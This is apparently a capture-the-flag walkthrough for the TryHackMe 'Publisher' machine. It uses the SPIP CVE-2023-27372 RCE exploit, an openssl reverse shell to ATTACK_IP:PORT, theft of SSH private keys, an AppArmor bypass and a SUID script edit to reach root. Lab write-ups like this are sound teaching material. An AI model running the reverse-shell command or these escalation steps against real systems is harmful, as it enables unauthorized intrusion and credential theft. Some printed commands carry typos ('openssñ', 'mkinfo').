---
title: "TryHackMe: Publisher"
date: 2025-12-11
categories: [CTFs, TryHackMe, Easy]
tags: [TryHackMe, TryHackMe Easy]
---

Machine by [josemlwdf](https://tryhackme.com/p/josemlwdf)

Tryhackme [link](https://tryhackme.com/room/publisher)

---

## Tools Used:<!-- omit in toc -->

- Kali Linux
- ffuf / dirb / gobuster
- whatweb
- git
- openssl
- python3
- linpeas


### 1. Nmap Scan

Doing a nmap scan reveals a webserver and ssh server:

![](/assets/img/ctf/tryhackme/easy/publisher/publisher_01.png)

<br>

### 2. ffuf scan

With a web directory scanner like [ffuf](https://www.kali.org/tools/ffuf/) I've scanned the files and directories of the webserver:

There is a `images` directory that doesn't contain anything, and a `spip` page.

![](/assets/img/ctf/tryhackme/easy/publisher/publisher_02.png)

[Spip](https://www.spip.net/en_rubrique25.html) is a project for publishing pages in a blog style website.

![](/assets/img/ctf/tryhackme/easy/publisher/publisher_03.png)

<br>

### 3. Vulnerability Scan

Using the tool [whatweb](https://www.kali.org/tools/whatweb/) on the `/spip/` page, we'll see that the server's services and versions it's runnign:

- Apache 2.4.41, doesn't have any useful vulnerability.
- SPIP 4.2.0, does have a RCE vulnerability.

![](/assets/img/ctf/tryhackme/easy/publisher/publisher_04.png)

By using [Exploit Database](https://www.exploit-db.com/exploits/51536) we'll find and exploit for this versin of SPIP, the CVE code is `2023-27372`:

![](/assets/img/ctf/tryhackme/easy/publisher/publisher_05.png)

Visiting the exploit's [github repo](https://github.com/nuts7/CVE-2023-27372) by [nuts7](https://github.com/nuts7) we'll get some more info on how to use the exploit and how it works:

![](/assets/img/ctf/tryhackme/easy/publisher/publisher_06.png)

Let's clone the repo:

![](/assets/img/ctf/tryhackme/easy/publisher/publisher_07.png)

### 4. Exploiting the SPIP page

What we want to do is create a a reverse shell, I tried to use some common reverse shells (from [revshells.com](https://www.revshells.com/)) but none other than the openssl seemed to work.

First of all, for the listener we'll need to create a ssl key pair with the command 
`openssñ req -new -x509 -keyout key.pem -out cert.pem -days 365 -nodes`:

![](/assets/img/ctf/tryhackme/easy/publisher/publisher_08.png)

And now let's open up a listener in whatever port on our attack machine (as long as it's not in use) with: 
`openssl s_server -quiet -key key.pem -cert cert.pem -port 6969`

![](/assets/img/ctf/tryhackme/easy/publisher/publisher_09.png)

And let's execute the exploit with the options:

- `-u http://VICTIM_IP`
- ```-c `mkinfo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACK_IP:PORT > /tmp/s ; rm /tmp/s` -v```

![](/assets/img/ctf/tryhackme/easy/publisher/publisher_10.png)

By executing the command, the listener we've set-up earlier will catch the session and open a very simple shell for us as the user `www-data` (the webserver's user):

![](/assets/img/ctf/tryhackme/easy/publisher/publisher_11.png)

Since the SPIP server contents are ont the user's `think` home folder, we can navigate it's contents, until finding the .ssh folder with it's private key:

![](/assets/img/ctf/tryhackme/easy/publisher/publisher_12.png)

### 5. Maintaining user access and user flag

To facilitate exploiting the server, let's:
- Save the `think` user private key.
- Use `chmod 600` to change the key permissions.
- Connect with ssh using the id_rsa key we just saved

On the user's home we can see our fist flag `user.txt`

![](/assets/img/ctf/tryhackme/easy/publisher/publisher_13.png)

### 6. Privilege escalation

There are some restrictions for our user's home write permissions, so we can't save files to it, 

I want to use linpeas from the [peas-ng toolkit](https://www.kali.org/tools/peass-ng), in kali, by default it's included int the folder `/usr/share/peass/linpeass` that we'll share using a simple python http server:

![](/assets/img/ctf/tryhackme/easy/publisher/publisher_14.png)

Using curl on the server and passing the result to sh we can execute the linpeas script without saving:

![](/assets/img/ctf/tryhackme/easy/publisher/publisher_15.png)

On the `Files with Interessting Permissions` there is a file `/usr/sbin/run_container` wich I'm not familiar with being on Linux, so most likely a custom user script:

![](/assets/img/ctf/tryhackme/easy/publisher/publisher_16.png)

With the `strings` command we can extract human-redable text strings from this binary, with the `/opt/run_container.sh` being something that caught my eye:

![](/assets/img/ctf/tryhackme/easy/publisher/publisher_17.png)

It seems that our user doesn't have read permissions for `/opt/*`

![](/assets/img/ctf/tryhackme/easy/publisher/publisher_18.png)

After trying a bunch of workarounds, and seeing if there where any other users, i found out that, even though our shell is using bash, in the passwd file it's listed as `/usr/sbin/ash` wich was wierd to me:

![](/assets/img/ctf/tryhackme/easy/publisher/publisher_19.png)

### 7. Bypassing apparmor restrictions

After looking at the linpeas results again and that `ash` shell I found the next file in the apparmor.d directory:

![](/assets/img/ctf/tryhackme/easy/publisher/publisher_20.png)

It lists diferent paths with each a set of rules, of wich the most important are:

The user can't:
- Read anything from `/opt/`
- Write anything inside `/opt/`
- Same with `/tmp/`
- Same with any of the directories under `/home/`
- And lastly, can't modify `/var/tmp` but we can modify it's contents.

![](/assets/img/ctf/tryhackme/easy/publisher/publisher_21.png)

Let's try to write in the `/var/tmp` a file with touch, since this worked, i've tried to copy the binary for bash to this folder:

![](/assets/img/ctf/tryhackme/easy/publisher/publisher_22.png)

Executing the `/var/tmp/bash` binary and trying to ls the contents of `/opt/` results in success!

![](/assets/img/ctf/tryhackme/easy/publisher/publisher_23.png)

Now, let's try to edit the `run_container.sh` script, since it has some SUID permissions maybe we can execute it as root:

![](/assets/img/ctf/tryhackme/easy/publisher/publisher_24.png)

And as suspected, the contents of /root/ are revealed!

![](/assets/img/ctf/tryhackme/easy/publisher/publisher_25.png)

Let's list the contents of the `id_rsa` private key of the root account:

![](/assets/img/ctf/tryhackme/easy/publisher/publisher_26.png)

This is the `run_containers.sh` modifications in order to list the private key:

![](/assets/img/ctf/tryhackme/easy/publisher/publisher_27.png)

### 8. Loggin in as root

Let's save the key, change it's permissions and log in through ssh like with the user account:

With `whoami` we'll se we are Root!:

![](/assets/img/ctf/tryhackme/easy/publisher/publisher_28.png)

We can now see the root folder and it's root flag:

![](/assets/img/ctf/tryhackme/easy/publisher/publisher_29.png)
